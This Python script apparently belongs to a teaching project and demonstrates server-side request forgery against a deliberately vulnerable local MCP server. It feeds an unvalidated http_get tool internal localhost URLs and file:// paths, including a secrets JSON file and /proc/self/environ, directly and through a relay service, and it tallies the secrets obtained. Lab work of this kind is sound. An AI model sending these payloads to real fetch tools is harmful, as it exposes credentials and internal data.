#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Attack Demonstrations

This script demonstrates SSRF attack techniques against the vulnerable MCP server.

SSRF Attack: The MCP is tricked into fetching a URL that points to internal-only data,
letting attackers read secret information the server can access but users cannot.

Vulnerability: The MCP server has an http_get tool that fetches URLs without validation,
allowing attackers to request internal resources (localhost, internal IPs, metadata services)
that they cannot access directly.

Attack Flow:
1. Attacker sends request to relay service with internal URL
2. Relay service forwards URL to MCP server
3. MCP server fetches the internal URL (which attacker cannot access)
4. MCP returns the internal data to relay service
5. Relay service returns data to attacker
"""

import asyncio
import sys
import json
import requests
import subprocess
import time
import signal
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# Track background processes for cleanup
background_processes = []

# Track secrets obtained during attacks for summary
secrets_obtained = []


# SSRF Attack Scenarios
# Demonstrates BOTH scenarios:
# Scenario 1: Secrets in other internal services (port 8080)
# Scenario 2: Secrets in the MCP server itself (config files)

SSRF_ATTACK_SCENARIOS_SCENARIO_1 = [
    {
        "name": "SSRF - Internal Admin Config (Scenario 1)",
        "description": "Access internal admin configuration with secrets from separate service",
        "url": "http://127.0.0.1:8080/admin/config",
        "expected": "MCP can access localhost:8080 (internal service) that attacker cannot",
        "secrets": "Admin passwords, database URLs, JWT secrets, encryption keys",
        "scenario": 1
    },
    {
        "name": "SSRF - Internal API Keys (Scenario 1)",
        "description": "Access internal API keys and secrets from separate service",
        "url": "http://127.0.0.1:8080/internal/keys",
        "expected": "MCP can access internal keys service that attacker cannot",
        "secrets": "AWS keys, GitHub tokens, Stripe keys, MongoDB connection strings",
        "scenario": 1
    },
    {
        "name": "SSRF - Instance Metadata (Scenario 1)",
        "description": "Access cloud instance metadata from separate service",
        "url": "http://127.0.0.1:8080/metadata/instance",
        "expected": "MCP can access metadata service that attacker cannot",
        "secrets": "Instance IDs, IAM roles, security groups, user data",
        "scenario": 1
    }
]

SSRF_ATTACK_SCENARIOS_SCENARIO_2 = [
    {
        "name": "SSRF - MCP Server Secrets File (Scenario 2)",
        "description": "Access MCP server's own secrets config file via file:// protocol",
        "url": "file:///cis_project/mcp_security_project/server/mcp_secrets.json",
        "expected": "MCP can access its own config file that contains secrets",
        "secrets": "Database passwords, API keys, JWT secrets, encryption keys stored in MCP server",
        "scenario": 2
    },
    {
        "name": "SSRF - MCP Server Secrets (Relative Path) (Scenario 2)",
        "description": "Access MCP server secrets using relative path",
        "url": "file://./server/mcp_secrets.json",
        "expected": "MCP can access its own config file using relative paths",
        "secrets": "All secrets stored in the MCP server's config file",
        "scenario": 2
    },
    {
        "name": "SSRF - Environment Variables (Scenario 2)",
        "description": "Attempt to access environment variables via /proc/self/environ",
        "url": "file:///proc/self/environ",
        "expected": "MCP might expose environment variables containing secrets",
        "secrets": "Environment variables with API keys, passwords, tokens",
        "scenario": 2
    }
]

# Combine both scenarios
SSRF_ATTACK_SCENARIOS = SSRF_ATTACK_SCENARIOS_SCENARIO_1 + SSRF_ATTACK_SCENARIOS_SCENARIO_2


class MCPClientWrapper:
    """Wrapper to make MCP client work for direct tool calls"""
    
    def __init__(self):
        self.session = None
        self.server_params = None
        
    async def initialize(self):
        """Initialize connection to MCP server"""
        project_root = Path(__file__).parent.parent.parent
        
        self.server_params = StdioServerParameters(
            command="python",
            args=["-m", "server.vulnerable_server"],
            env=None,
            cwd=str(project_root)
        )
        
        self.stdio_context = stdio_client(self.server_params)
        self.stdio_transport = await self.stdio_context.__aenter__()
        read, write = self.stdio_transport
        
        self.session_context = ClientSession(read, write)
        self.session = await self.session_context.__aenter__()
        await self.session.initialize()
    
    async def call_tool(self, tool_name: str, arguments: dict) -> dict:
        """Call a tool on the MCP server"""
        if not self.session:
            raise RuntimeError("MCP client not initialized")
            
        try:
            result = await self.session.call_tool(tool_name, arguments)
            if result.content:
                content_text = result.content[0].text if result.content else ""
                try:
                    return json.loads(content_text)
                except json.JSONDecodeError:
                    return {"raw": content_text}
            return {"status": "success"}
        except Exception as e:
            return {"error": str(e)}
    
    async def cleanup(self):
        """Clean up connections"""
        if hasattr(self, 'session_context') and self.session_context:
            await self.session_context.__aexit__(None, None, None)
        if hasattr(self, 'stdio_context') and self.stdio_context:
            await self.stdio_context.__aexit__(None, None, None)


async def create_mcp_client():
    """Create and initialize MCP client"""
    client = MCPClientWrapper()
    await client.initialize()
    return client


async def run_ssrf_attack_direct(mcp_client, attack_scenario):
    """Run SSRF attack by directly calling MCP server"""
    
    scenario_num = attack_scenario.get('scenario', '?')
    print(f"\n{'='*80}")
    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']}")
    print(f"{'='*80}")
    print(f"Scenario: {scenario_num} - {'Secrets in separate internal service' if scenario_num == 1 else 'Secrets in MCP server itself'}")
    print(f"Description: {attack_scenario['description']}")
    print(f"Target URL: {attack_scenario['url']}")
    print(f"Expected: {attack_scenario['expected']}")
    print(f"Secrets at risk: {attack_scenario.get('secrets', 'N/A')}")
    print(f"{'─'*80}\n")
    
    print(f"[ATTACK] MCP server requested URL (should not be allowed): {attack_scenario['url']}")
    print(f"[VULNERABILITY] MCP server fetched this URL without validation - this is the SSRF vulnerability!")
    
    try:
        result = await mcp_client.call_tool("http_get", {"url": attack_scenario['url']})
        
        print(f"[RESULT] MCP server response:")
        print(json.dumps(result, indent=2))
        
        if "error" in result:
            print(f"\n[INFO] Attack attempted but failed (expected for some internal services)")
        elif result.get("status") == "success":
            print(f"\n[SUCCESS] ⚠️  SSRF attack successful! MCP fetched internal resource.")
            if "content" in result:
                content_preview = result["content"][:200] if len(result.get("content", "")) > 200 else result.get("content", "")
                print(f"[DATA] Content preview: {content_preview}...")
                
                # Track secrets obtained
                secrets_obtained.append({
                    "attack": attack_scenario['name'],
                    "url": attack_scenario['url'],
                    "scenario": scenario_num,
                    "secrets": attack_scenario.get('secrets', 'N/A')
                })
        else:
            print(f"\n[RESULT] {result}")
            
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
    
    print(f"{'─'*80}")
    await asyncio.sleep(1)


async def run_ssrf_attack_via_relay(attack_scenario):
    """Run SSRF attack via relay service"""
    
    scenario_num = attack_scenario.get('scenario', '?')
    print(f"\n{'='*80}")
    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']} (via Relay Service)")
    print(f"{'='*80}")
    print(f"Scenario: {scenario_num} - {'Secrets in separate internal service' if scenario_num == 1 else 'Secrets in MCP server itself'}")
    print(f"Description: {attack_scenario['description']}")
    print(f"Target URL: {attack_scenario['url']}")
    print(f"Expected: {attack_scenario['expected']}")
    print(f"Secrets at risk: {attack_scenario.get('secrets', 'N/A')}")
    print(f"{'─'*80}\n")
    
    relay_url = f"http://127.0.0.1:8001/fetch?url={attack_scenario['url']}"
    print(f"[ATTACK] Attacker sends request to relay service (external service): {relay_url}")
    print(f"[ATTACK] Relay service forwards URL to MCP server")
    print(f"[VULNERABILITY] MCP server requested URL (should not be allowed): {attack_scenario['url']}")
    print(f"[VULNERABILITY] MCP server fetched this URL without validation - this is the SSRF vulnerability!")
    
    try:
        response = requests.get(relay_url, timeout=30)
        result = response.json()
        
        print(f"[RESULT] Relay service (external service) response:")
        print(json.dumps(result, indent=2))
        
        if result.get("status") == "success":
            print(f"\n[SUCCESS] ⚠️  SSRF attack successful via relay service!")
            mcp_result = result.get("mcp_result", {})
            if mcp_result.get("status") == "success":
                # Track secrets obtained
                secrets_obtained.append({
                    "attack": attack_scenario['name'],
                    "url": attack_scenario['url'],
                    "scenario": scenario_num,
                    "secrets": attack_scenario.get('secrets', 'N/A'),
                    "via_relay": True
                })
        else:
            print(f"\n[RESULT] {result.get('message', 'Unknown error')}")
            
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] Cannot connect to relay service at http://127.0.0.1:8001")
        print(f"[INFO] Make sure the relay service is running: python -m external_service.ssrf_service")
    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")
    
    print(f"{'─'*80}")
    await asyncio.sleep(1)


def check_service_running(port: int) -> bool:
    """Check if a service is running on the given port"""
    try:
        response = requests.get(f"http://127.0.0.1:{port}/", timeout=1)
        return response.status_code == 200
    except:
        return False


def start_service(name: str, module: str, port: int) -> subprocess.Popen:
    """Start a service in the background"""
    print(f"[START] Starting {name} on port {port}...")
    try:
        process = subprocess.Popen(
            [sys.executable, "-m", module],
            cwd=str(project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait for service to start (check multiple times)
        max_attempts = 10
        for attempt in range(max_attempts):
            time.sleep(0.5)
            if check_service_running(port):
                print(f"[OK] {name} started successfully (PID: {process.pid})")
                return process
            if process.poll() is not None:
                # Process died
                stderr = process.stderr.read() if process.stderr else "Unknown error"
                print(f"[ERROR] {name} process died: {stderr}")
                return None
        
        print(f"[WARNING] {name} may not be fully ready, but continuing...")
        return process
    except Exception as e:
        print(f"[ERROR] Failed to start {name}: {e}")
        return None


def cleanup_processes():
    """Clean up background processes"""
    if not background_processes:
        return
    
    print("\n[CLEANUP] Stopping background services...")
    for process in background_processes:
        if process and process.poll() is None:
            try:
                process.terminate()
                process.wait(timeout=5)
                print(f"[OK] Stopped process {process.pid}")
            except subprocess.TimeoutExpired:
                try:
                    process.kill()
                    print(f"[OK] Killed process {process.pid}")
                except:
                    pass
            except:
                pass
    
    # Clear the list
    background_processes.clear()


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    cleanup_processes()
    sys.exit(0)


async def run_all_ssrf_attacks():
    """Run all SSRF attack demonstrations"""
    
    # Register signal handler for cleanup
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    print("\n" + "="*80)
    print("  SSRF (Server-Side Request Forgery) ATTACK DEMONSTRATIONS")
    print("="*80)
    print("\nThis script demonstrates SSRF attack techniques against the vulnerable MCP server.")
    print("\nSSRF Attack: The MCP is tricked into fetching URLs that point to internal resources,")
    print("letting attackers read secrets that the MCP server can access but they cannot.")
    print("\nTWO SCENARIOS DEMONSTRATED:")
    print("  Scenario 1: Secrets in other internal services (port 8080)")
    print("    - Secrets stored in separate internal service")
    print("    - MCP server accesses them via HTTP (localhost:8080)")
    print("    - More typical SSRF pattern")
    print("\n  Scenario 2: Secrets in the MCP server itself")
    print("    - Secrets stored in MCP server's config files")
    print("    - MCP server accesses them via file:// protocol")
    print("    - Also realistic - MCP servers often store secrets locally")
    print("\n[AUTO-START] Checking and starting required services...")
    print("="*80 + "\n")
    
    # Check and start internal target service (Scenario 1)
    internal_service_started = False
    if not check_service_running(8080):
        print("[INFO] Internal target service (port 8080) not running, starting it...")
        process = start_service("Internal Target Service", "external_service.internal_target_service", 8080)
        if process:
            background_processes.append(process)
            internal_service_started = True
    else:
        print("[OK] Internal target service (port 8080) is already running (will reuse existing)")
    
    # Check and start relay service
    relay_service_started = False
    if not check_service_running(8001):
        print("[INFO] Relay service (port 8001) not running, starting it...")
        process = start_service("SSRF Relay Service", "external_service.ssrf_service", 8001)
        if process:
            background_processes.append(process)
            relay_service_started = True
    else:
        print("[OK] Relay service (port 8001) is already running (will reuse existing)")
    
    # Give services a moment to fully initialize
    if internal_service_started or relay_service_started:
        print("[INFO] Waiting for services to fully initialize...")
        time.sleep(1)
    
    print("\n[WARNING] These are real attack demonstrations!")
    print("="*80 + "\n")
    
    # Number the attacks
    for i, attack in enumerate(SSRF_ATTACK_SCENARIOS, 1):
        attack['number'] = i
    
    # Method 1: Direct MCP calls
    print("\n" + "="*80)
    print("  METHOD 1: Direct MCP Server Calls")
    print("="*80)
    print("Demonstrating SSRF by directly calling MCP server's http_get tool\n")
    
    # Initialize MCP client
    print("[CONNECT] Connecting to MCP server...")
    try:
        mcp_client = await create_mcp_client()
        print("[OK] Connected to MCP server\n")
    except Exception as e:
        print(f"[ERROR] Failed to connect to MCP server: {e}")
        print("\nMake sure you can run the MCP server:")
        print("  python -m server.vulnerable_server")
        return
    
    # Run direct attacks
    print(f"[RUN] Running {len(SSRF_ATTACK_SCENARIOS)} SSRF attack scenarios (direct)...\n")
    
    for attack_scenario in SSRF_ATTACK_SCENARIOS:
        await run_ssrf_attack_direct(mcp_client, attack_scenario)
    
    # Cleanup
    await mcp_client.cleanup()
    
    # Method 2: Via relay service
    print("\n\n" + "="*80)
    print("  METHOD 2: Via Relay Service (External Service)")
    print("="*80)
    print("Demonstrating SSRF via relay service (external service) - more realistic attack scenario\n")
    print("The relay service (external service) forwards requests to MCP server.")
    print("The MCP server contains the secrets in its config files.\n")
    print("[INFO] Make sure relay service (external service) is running:")
    print("  python -m external_service.ssrf_service")
    print("\n[RUN] Running SSRF attacks via relay service (external service)...\n")
    
    for attack_scenario in SSRF_ATTACK_SCENARIOS:
        await run_ssrf_attack_via_relay(attack_scenario)
    
    print("\n" + "="*80)
    print("  SSRF ATTACK DEMONSTRATIONS COMPLETE")
    print("="*80)
    print("\nSummary:")
    print("  Scenario 1: Secrets in separate internal services (port 8080)")
    print("    - MCP can access internal HTTP services that attacker cannot")
    print("    - Secrets stored in internal_target_service.py")
    print("\n  Scenario 2: Secrets in MCP server itself")
    print("    - MCP can access its own config files via file:// protocol")
    print("    - Secrets stored in server/mcp_secrets.json")
    print("\n  Attack Methods:")
    print("    - Direct MCP calls: Shows MCP can fetch internal resources")
    print("    - Via relay service (external service): Shows realistic attack flow")
    print("\n  The vulnerability: MCP fetches URLs (HTTP and file://) without validation")
    print("    - MCP server requested internal URLs that it should not be allowed to access")
    print("    - No URL validation, no domain/IP whitelist, no protocol restrictions")
    print("\n  Secrets Obtained:")
    if secrets_obtained:
        for i, secret_info in enumerate(secrets_obtained, 1):
            method = "via relay service" if secret_info.get("via_relay") else "direct MCP call"
            print(f"    {i}. {secret_info['attack']} ({method})")
            print(f"       URL requested: {secret_info['url']}")
            print(f"       Secrets obtained: {secret_info['secrets']}")
    else:
        print("    No secrets were successfully obtained in this run.")
    print("="*80 + "\n")
    
    # Cleanup background processes
    cleanup_processes()


if __name__ == "__main__":
    try:
        asyncio.run(run_all_ssrf_attacks())
    except KeyboardInterrupt:
        print("\n\n[INTERRUPTED] Cleaning up...")
        cleanup_processes()
        sys.exit(0)
    except Exception as e:
        print(f"\n[ERROR] {e}")
        cleanup_processes()
        sys.exit(1)

